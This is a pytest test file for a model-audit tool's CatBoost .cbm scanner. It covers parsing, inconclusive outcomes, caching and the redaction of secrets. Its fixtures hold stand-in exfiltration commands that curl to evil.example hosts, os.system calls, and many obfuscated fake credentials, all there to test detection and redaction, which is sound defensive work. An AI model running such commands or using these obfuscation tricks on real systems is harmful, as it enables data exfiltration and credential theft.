"""Tests for CatBoost .cbm scanner."""

from __future__ import annotations

import base64
import json
import struct
from pathlib import Path

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.integrations.sarif_formatter import format_sarif_output
from modelaudit.scanners import catboost_scanner, get_scanner_for_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.catboost_scanner import (
    CatBoostScanner,
    _redact_evidence_for_display,
    _redact_reversible_base64_evidence,
)
from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic


def _build_cbm(core_strings: list[str], trailing_strings: list[str] | None = None) -> bytes:
    core_blob = b"\x00".join(s.encode("utf-8") for s in core_strings)
    trailing_blob = b"\x00".join(s.encode("utf-8") for s in (trailing_strings or []))
    return b"CBM1" + struct.pack("<I", len(core_blob)) + core_blob + trailing_blob


def test_can_handle_valid_cbm_file(tmp_path: Path) -> None:
    model_path = tmp_path / "safe.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "loss_function",
                "metadata",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    assert CatBoostScanner.can_handle(str(model_path)) is True


def test_can_handle_rejects_non_cbm_content_with_cbm_extension(tmp_path: Path) -> None:
    fake_path = tmp_path / "renamed.cbm"
    fake_path.write_bytes(b"not a catboost model")

    assert CatBoostScanner.can_handle(str(fake_path)) is False


def test_can_handle_accepts_corrupt_cbm_magic_for_fail_closed_scan(tmp_path: Path) -> None:
    corrupt_path = tmp_path / "corrupt.cbm"
    corrupt_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    assert CatBoostScanner.can_handle(str(corrupt_path)) is True


def test_scan_benign_cbm_has_no_critical_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "benign.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "system_temperature",
                "exec_time_ms",
                "cat_feature_hash_to_string",
                "class_names",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)

    header_checks = [check for check in result.checks if check.name == "CatBoost Header Signature Check"]
    assert header_checks
    assert header_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_cbm_reports_structured_parse_failure(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    # Declared core size is larger than the available data.
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["catboost_structure_parse_failed"]
    assert any(
        check.name == "CatBoost Core Section Bounds Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "CatBoost Structure Parsing" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_corrupt_cbm_aggregate_exit_code_is_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    metadata = result.file_metadata[str(model_path)]
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_structure_parse_failed" in metadata["scan_outcome_reasons"]
    assert result.success is False
    assert determine_exit_code(result) == 2


def test_scan_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata"]))

    def raise_os_error(
        _self: CatBoostScanner,
        _path: str,
        _file_size: int,
        _result: ScanResult,
    ) -> tuple[bytes, bytes, int, int]:
        raise OSError("simulated storage read failure")

    monkeypatch.setattr(CatBoostScanner, "_parse_sections", raise_os_error)

    direct = CatBoostScanner().scan(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "CatBoost File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "catboost_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_read_failed" in direct.metadata["scan_outcome_reasons"]
    metadata = aggregate.file_metadata[str(model_path)]
    assert "catboost_read_failed" in metadata["scan_outcome_reasons"]
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_scan_bounded_parse_marks_uninspected_catboost_bytes_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata" * 16], trailing_strings=["late-safe"]))

    result = CatBoostScanner(config={"catboost_core_scan_budget": 8, "catboost_trailing_scan_budget": 0}).scan(
        str(model_path)
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_bounded_parse_incomplete" in result.metadata["scan_outcome_reasons"]
    bounded_checks = [check for check in result.checks if check.name == "CatBoost Bounded Parse Check"]
    assert len(bounded_checks) == 1
    assert bounded_checks[0].status == CheckStatus.FAILED
    assert bounded_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_limit_marks_late_payload_analysis_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "safe_fragment_one",
                "safe_fragment_two",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
            ],
        ),
    )

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert budget_checks[0].details["truncated_sections"] == ["core"]
    assert budget_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_exact_limit_preserves_clean_result(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings-benign.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_scan_string_extraction_limit_aggregate_is_inconclusive_and_uncached(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for result in (first, second):
            metadata = result.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "catboost_string_extraction_limit_exceeded" in metadata["scan_outcome_reasons"]
            assert determine_exit_code(result) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
                "callback=https://evil.example/webhook",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    correlation_checks = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert correlation_checks
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL


def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
    model_path = tmp_path / "network.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "download_url=https://collector.evil.example/upload",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    network_checks = [check for check in result.checks if check.name == "Network Indicator Check"]
    assert network_checks
    assert network_checks[0].status == CheckStatus.FAILED
    assert network_checks[0].severity == IssueSeverity.WARNING


def test_scan_redacts_urls_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "network_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    "python -c \"import os; os.system('curl "
                    "https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag')\""
                ),
                "download_url=https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "https://collector.evil.example/upload" in failed_details
    assert "cat_user" not in failed_details
    assert "cat_pass" not in failed_details
    assert "CATBOOST_SECRET" not in failed_details
    assert "#frag" not in failed_details


def test_scan_redacts_non_url_secrets_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "command_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    "os.system('curl -H Authorization: Bearer sk-catboost-secret1234567890 "
                    "https://collector.evil.example/upload')"
                ),
                "os.system('id'); aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "os.system('id'); client_secret='client-secret-value-abcdef'",
                r'os.system("id"); client_secret=\"C001_ESCAPED_SECRET_123456\"',
                r'os.system("id"); Authorization: Bearer \"C001_ESCAPED_BEARER_123456\"',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details
    assert "collector.evil.example" in failed_details
    assert "sk-catboost-secret" not in failed_details
    assert "wJalrXUtnFEMI" not in failed_details
    assert "client-secret-value" not in failed_details
    assert "C001_ESCAPED_SECRET" not in failed_details
    assert "C001_ESCAPED_BEARER" not in failed_details
    assert "<redacted>" in failed_details


def test_scan_redacts_nested_escaped_non_url_secrets_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "nested_escaped_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                r'os.system("id"); api_key=\\\"C001_NESTED_API_SECRET_123456\\\"',
                r'os.system("id"); Authorization: Bearer \\\"C001_NESTED_BEARER_SECRET_123456\\\"',
                r'os.system("id"); api_key=\C001_SLASH_API_SECRET_123456',
                r'os.system("id"); Authorization: \C001_SLASH_AUTH_SECRET_123456',
                r'os.system("id"); client_secret=\u0022C001_UNICODE_SECRET_123456\u0022',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details
    assert "C001_NESTED_API_SECRET" not in failed_details
    assert "C001_NESTED_BEARER_SECRET" not in failed_details
    assert "C001_SLASH_API_SECRET" not in failed_details
    assert "C001_SLASH_AUTH_SECRET" not in failed_details
    assert "C001_UNICODE_SECRET" not in failed_details
    assert "<redacted>" in failed_details


def test_scan_redacts_long_quoted_secret_suffixes_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "long_quoted_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                f'os.system("id"); api_key="prefix C001_LONG_SPACE_API_SECRET_123456{"a" * 5000}"',
                (f'os.system("id"); Authorization: Bearer "prefix;C001_LONG_SEMI_AUTH_SECRET_123456{"a" * 5000}"'),
                f'os.system("id"); Bearer "prefix C001_LONG_SPACE_BEARER_SECRET_123456{"a" * 5000}"',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details
    assert "C001_LONG_SPACE_API_SECRET" not in failed_details
    assert "C001_LONG_SEMI_AUTH_SECRET" not in failed_details
    assert "C001_LONG_SPACE_BEARER_SECRET" not in failed_details
    assert "<redacted>" in failed_details


def test_scan_redacts_unicode_quoted_secret_suffixes_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "unicode_quoted_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                r'os.system("id"); client_secret=\u0022prefix C001_UNICODE_SPACE_SECRET_123456\u0022',
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u0022prefix;C001_UNICODE_AUTH_SECRET_123456\u0022"
                ),
                r'os.system("id"); Bearer \u0022prefix C001_UNICODE_BEARER_SECRET_123456\u0022',
                (
                    r'os.system("id"); client_secret='
                    r"\u005c\u0022prefix C001_ENCBACKSLASH_API_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u005c\u0022prefix;C001_ENCBACKSLASH_AUTH_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\u0022prefix C001_ENCBACKSLASH_BEARER_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\\u005c\\u0022prefix C001_DOUBLEENC_API_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\\u005c\\u0022prefix;C001_DOUBLEENC_AUTH_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\\u005c\\u0022prefix C001_DOUBLEENC_BEARER_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\u005c\"prefix C001_MIXED_API_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u005c\"prefix;C001_MIXED_AUTH_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\"prefix C001_MIXED_BEARER_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\\u005c\\\"prefix C001_DOUBLEMIXED_API_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\\u005c\\\"prefix;C001_DOUBLEMIXED_AUTH_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\\u005c\\\"prefix C001_DOUBLEMIXED_BEARER_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\x22prefix C001_HEX_API_SECRET_123456\x22"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\x22prefix;C001_HEX_AUTH_SECRET_123456\x22"
                ),
                r'os.system("id"); Bearer \x22prefix C001_HEX_BEARER_SECRET_123456\x22',
                (
                    r'os.system("id"); client_secret='
                    r"\x5c\x22prefix C001_HEXBACKSLASH_API_SECRET_123456\x5c\x22"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\x5c\x22prefix;C001_HEXBACKSLASH_AUTH_SECRET_123456\x5c\x22"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\x22prefix C001_UNICODE_HEX_BEARER_SECRET_123456\u005c\x22"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\x5c\"prefix C001_HEXMIXED_API_SECRET_123456\x5c\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\042prefix C001_OCTAL_API_SECRET_123456\042"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\042prefix;C001_OCTAL_AUTH_SECRET_123456\042"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\U00000022prefix C001_LONGU_BEARER_SECRET_123456\U00000022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u{22}prefix;C001_JSU_AUTH_SECRET_123456\u{22}"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\134\042prefix C001_OCTALBACKSLASH_API_SECRET_123456\134\042"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\42prefix C001_SHORTOCT_API_SECRET_123456\42"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\42prefix;C001_SHORTOCT_AUTH_SECRET_123456\42"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u{0022}prefix C001_PADJS_BEARER_SECRET_123456\u{0022}"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u{005c}\u{0022}prefix;C001_PADJSBS_AUTH_SECRET_123456\u{005c}\u{0022}"
                ),
                'os.system("id"); client_secret="""prefix C001_TRIPLE_API_SECRET_123456"""',
                'os.system("id"); Authorization: Bearer """prefix;C001_TRIPLE_AUTH_SECRET_123456"""',
                'os.system("id"); client_secret=r"prefix C001_PREFIX_API_SECRET_123456"',
                'os.system("id"); Authorization: Bearer f"prefix;C001_PREFIX_AUTH_SECRET_123456"',
                r'os.system("id"); client_secret=\uu0022prefix C001_UU_API_SECRET_123456\uu0022',
                r'os.system("id"); client_secret=\"\"\"prefix C001_ESCTRIPLE_API_SECRET_123456\"\"\"',
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u0022\u0022\u0022prefix;C001_UNITRIPLE_AUTH_SECRET_123456\u0022\u0022\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"r\u0022\u0022\u0022prefix C001_PUNITRIPLE_API_SECRET_123456\u0022\u0022\u0022"
                ),
                'os.system("id"); client_secret=("prefix C001_PAREN_API_SECRET_123456")',
                'os.system("id"); client_secret="prefix " "C001_CONCAT_API_SECRET_123456"',
                'os.system("id"); client_secret="prefix " """C001_CONCAT_TRIPLE_SECRET_123456"""',
                'os.system("id"); client_secret="prefix " + "C001_PLUS_API_SECRET_123456"',
                'os.system("id"); client_secret=("prefix " + "C001_PARENPLUS_API_SECRET_123456")',
                'os.system("id"); client_secret="prefix " + """C001_PLUSTRIPLE_API_SECRET_123456"""',
                'os.system("id"); client_secret="prefix %s" % "C001_PERCENT_API_SECRET_123456"',
                'os.system("id"); client_secret=("prefix %s" % "C001_PARENPERCENT_API_SECRET_123456")',
                "os.system(\"id\"); client_secret=''.join(('prefix ', 'C001_JOIN_API_SECRET_123456'))",
                'os.system("id"); client_secret="prefix {}".format("C001_FORMAT_API_SECRET_123456")',
                'os.system("id"); client_secret="" or "C001_OR_API_SECRET_123456"',
                'os.system("id"); client_secret="decoy" if False else "C001_ELSE_API_SECRET_123456"',
                'os.system("id"); client_secret=str("C001_CALLFIRST_API_SECRET_123456")',
                'os.system("id"); client_secret=["C001_LISTFIRST_API_SECRET_123456"][0]',
                'os.system("id"); client_secret=(lambda: "C001_LAMBDAFIRST_API_SECRET_123456")()',
                'os.system("id"); client_secret=str("token=decoy C001_INNERPREFIX_API_SECRET_123456")',
                r'os.system("id"); client_secret=str("quote: \" token=decoy C001_ESCINNER_API_SECRET_123456")',
                'config={"client_secret": "C001_JSONKEY_CLIENT_SECRET_123456"}; os.system("id")',
                'config={"api_key": "C001_JSONKEY_API_SECRET_123456"}; os.system("id")',
                r'config={"client\u005fsecret": "C001_KEYUNICODE_CLIENT_SECRET_123456"}; os.system("id")',
                r'config={"api\x5fkey": "C001_KEYHEX_API_SECRET_123456"}; os.system("id")',
                r'config={"client\U0000005fsecret": "C001_KEYLONGU_SECRET_123456"}; os.system("id")',
                r'config={"api\N{LOW LINE}key": "C001_KEYNAMED_SECRET_123456"}; os.system("id")',
                'config={"client" + "_secret": "C001_KEYPLUS_SECRET_123456"}; os.system("id")',
                'config={"api" "_key": "C001_KEYIMPLICIT_SECRET_123456"}; os.system("id")',
                'config={"client%s" % "_secret": "C001_KEYPERCENT_SECRET_123456"}; os.system("id")',
                'config={"client{}".format("_secret"): "C001_KEYFORMAT_SECRET_123456"}; os.system("id")',
                'config={"client{suffix}".format(suffix="_secret"): "C001_KEYKWFORMAT_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\'}": "C001_KEYFSTRING_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\'!s}": "C001_KEYFCONV_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\':s}": "C001_KEYFSPEC_SECRET_123456"}; os.system("id")',
                'config={str("client_secret"): "C001_KEYSTRCALL_SECRET_123456"}; os.system("id")',
                'config={"client_secret".strip(): "C001_KEYSTRIP_SECRET_123456"}; os.system("id")',
                'config={"".join(("client", "_secret")): "C001_KEYJOIN_SECRET_123456"}; os.system("id")',
                'config={"__client_secret__".strip("_"): "C001_KEYSTRIPARG_SECRET_123456"}; os.system("id")',
                'config={"clientXsecret".replace("X", "_"): "C001_KEYREPLACE_SECRET_123456"}; os.system("id")',
                'config={("client_secret",)[0]: "C001_KEYINDEX_SECRET_123456"}; os.system("id")',
                'config={"terces_tneilc"[::-1]: "C001_KEYREVERSE_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].lower(): "C001_KEYREVERSELOWER_SECRET_123456"}; os.system("id")',
                'config={("terces_tneilc" * 1)[::-1]: "C001_KEYREVERSEMULT_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].swapcase(): "C001_KEYSWAPCASE_SECRET_123456"}; os.system("id")',
                'config={"client_secret".zfill(0): "C001_KEYZFILL_SECRET_123456"}; os.system("id")',
                'config={("client" + "_secret").zfill(0): "C001_KEYCOMPOSEDZFILL_SECRET_123456"}; os.system("id")',
                'config={"client_secret".expandtabs(): "C001_KEYEXPANDTABS_SECRET_123456"}; os.system("id")',
                'config={("client_secret" or "public"): "C001_KEYBOOLOR_SECRET_123456"}; os.system("id")',
                'config={("client_secret" or "public".islower()): "C001_KEYBOOLSHORT_SECRET_123456"}; os.system("id")',
                'config={("client_secret" if "yes" else "public"): "C001_KEYTRUTHYIF_SECRET_123456"}; os.system("id")',
                'config={("client_secret" if 1 else "public"): "C001_KEYNUMIF_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" if ("yes",) else "public"): '
                    '"C001_KEYTUPLEIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if 1 == 1 else "public"): '
                    '"C001_KEYCOMPAREIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if (1 == 1 and 2 == 2) else "public"): '
                    '"C001_KEYANDCOMPARE_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "x" else "public"): '
                    '"C001_KEYCONTAINS_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "xy" == "xy" else "public"): '
                    '"C001_KEYCHAIN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in ("x",) else "public"): '
                    '"C001_KEYTUPMEM_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": "client_secret"}["x"]: "C001_KEYDICTLOOKUP_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client_secret", "unused": True}["x"]: '
                    '"C001_KEYDICTEXTRA_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": True, "x": "client_secret"}["x"]: "C001_KEYDUPLAST_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client" + "_secret", 1: True}["x"]: '
                    '"C001_KEYDICTNONSTRKEY_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{"x": "client" + "_secret", **{}}["x"]: '
                    '"C001_KEYDICTUNPACK_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{("x".islower() and "x"): True, "x": "client_secret"}["x"]: '
                    '"C001_KEYPREUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{**{("x".islower() and "x"): True}, "x": "client_secret"}["x"]: '
                    '"C001_KEYUNPACKUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details
    assert "C001_UNICODE_SPACE_SECRET" not in failed_details
    assert "C001_UNICODE_AUTH_SECRET" not in failed_details
    assert "C001_UNICODE_BEARER_SECRET" not in failed_details
    assert "C001_ENCBACKSLASH_API_SECRET" not in failed_details
    assert "C001_ENCBACKSLASH_AUTH_SECRET" not in failed_details
    assert "C001_ENCBACKSLASH_BEARER_SECRET" not in failed_details
    assert "C001_DOUBLEENC_API_SECRET" not in failed_details
    assert "C001_DOUBLEENC_AUTH_SECRET" not in failed_details
    assert "C001_DOUBLEENC_BEARER_SECRET" not in failed_details
    assert "C001_MIXED_API_SECRET" not in failed_details
    assert "C001_MIXED_AUTH_SECRET" not in failed_details
    assert "C001_MIXED_BEARER_SECRET" not in failed_details
    assert "C001_DOUBLEMIXED_API_SECRET" not in failed_details
    assert "C001_DOUBLEMIXED_AUTH_SECRET" not in failed_details
    assert "C001_DOUBLEMIXED_BEARER_SECRET" not in failed_details
    assert "C001_HEX_API_SECRET" not in failed_details
    assert "C001_HEX_AUTH_SECRET" not in failed_details
    assert "C001_HEX_BEARER_SECRET" not in failed_details
    assert "C001_HEXBACKSLASH_API_SECRET" not in failed_details
    assert "C001_HEXBACKSLASH_AUTH_SECRET" not in failed_details
    assert "C001_UNICODE_HEX_BEARER_SECRET" not in failed_details
    assert "C001_HEXMIXED_API_SECRET" not in failed_details
    assert "C001_OCTAL_API_SECRET" not in failed_details
    assert "C001_OCTAL_AUTH_SECRET" not in failed_details
    assert "C001_LONGU_BEARER_SECRET" not in failed_details
    assert "C001_JSU_AUTH_SECRET" not in failed_details
    assert "C001_OCTALBACKSLASH_API_SECRET" not in failed_details
    assert "C001_SHORTOCT_API_SECRET" not in failed_details
    assert "C001_SHORTOCT_AUTH_SECRET" not in failed_details
    assert "C001_PADJS_BEARER_SECRET" not in failed_details
    assert "C001_PADJSBS_AUTH_SECRET" not in failed_details
    assert "C001_TRIPLE_API_SECRET" not in failed_details
    assert "C001_TRIPLE_AUTH_SECRET" not in failed_details
    assert "C001_PREFIX_API_SECRET" not in failed_details
    assert "C001_PREFIX_AUTH_SECRET" not in failed_details
    assert "C001_UU_API_SECRET" not in failed_details
    assert "C001_ESCTRIPLE_API_SECRET" not in failed_details
    assert "C001_UNITRIPLE_AUTH_SECRET" not in failed_details
    assert "C001_PUNITRIPLE_API_SECRET" not in failed_details
    assert "C001_PAREN_API_SECRET" not in failed_details
    assert "C001_CONCAT_API_SECRET" not in failed_details
    assert "C001_CONCAT_TRIPLE_SECRET" not in failed_details
    assert "C001_PLUS_API_SECRET" not in failed_details
    assert "C001_PARENPLUS_API_SECRET" not in failed_details
    assert "C001_PLUSTRIPLE_API_SECRET" not in failed_details
    assert "C001_PERCENT_API_SECRET" not in failed_details
    assert "C001_PARENPERCENT_API_SECRET" not in failed_details
    assert "C001_JOIN_API_SECRET" not in failed_details
    assert "C001_FORMAT_API_SECRET" not in failed_details
    assert "C001_OR_API_SECRET" not in failed_details
    assert "C001_ELSE_API_SECRET" not in failed_details
    assert "C001_CALLFIRST_API_SECRET" not in failed_details
    assert "C001_LISTFIRST_API_SECRET" not in failed_details
    assert "C001_LAMBDAFIRST_API_SECRET" not in failed_details
    assert "C001_INNERPREFIX_API_SECRET" not in failed_details
    assert "C001_ESCINNER_API_SECRET" not in failed_details
    assert "C001_JSONKEY_CLIENT_SECRET" not in failed_details
    assert "C001_JSONKEY_API_SECRET" not in failed_details
    assert "C001_KEYUNICODE_CLIENT_SECRET" not in failed_details
    assert "C001_KEYHEX_API_SECRET" not in failed_details
    assert "C001_KEYLONGU_SECRET" not in failed_details
    assert "C001_KEYNAMED_SECRET" not in failed_details
    assert "C001_KEYPLUS_SECRET" not in failed_details
    assert "C001_KEYIMPLICIT_SECRET" not in failed_details
    assert "C001_KEYPERCENT_SECRET" not in failed_details
    assert "C001_KEYFORMAT_SECRET" not in failed_details
    assert "C001_KEYKWFORMAT_SECRET" not in failed_details
    assert "C001_KEYFSTRING_SECRET" not in failed_details
    assert "C001_KEYFCONV_SECRET" not in failed_details
    assert "C001_KEYFSPEC_SECRET" not in failed_details
    assert "C001_KEYSTRCALL_SECRET" not in failed_details
    assert "C001_KEYSTRIP_SECRET" not in failed_details
    assert "C001_KEYJOIN_SECRET" not in failed_details
    assert "C001_KEYSTRIPARG_SECRET" not in failed_details
    assert "C001_KEYREPLACE_SECRET" not in failed_details
    assert "C001_KEYINDEX_SECRET" not in failed_details
    assert "C001_KEYREVERSE_SECRET" not in failed_details
    assert "C001_KEYREVERSELOWER_SECRET" not in failed_details
    assert "C001_KEYREVERSEMULT_SECRET" not in failed_details
    assert "C001_KEYSWAPCASE_SECRET" not in failed_details
    assert "C001_KEYZFILL_SECRET" not in failed_details
    assert "C001_KEYCOMPOSEDZFILL_SECRET" not in failed_details
    assert "C001_KEYEXPANDTABS_SECRET" not in failed_details
    assert "C001_KEYBOOLOR_SECRET" not in failed_details
    assert "C001_KEYBOOLSHORT_SECRET" not in failed_details
    assert "C001_KEYTRUTHYIF_SECRET" not in failed_details
    assert "C001_KEYNUMIF_SECRET" not in failed_details
    assert "C001_KEYTUPLEIF_SECRET" not in failed_details
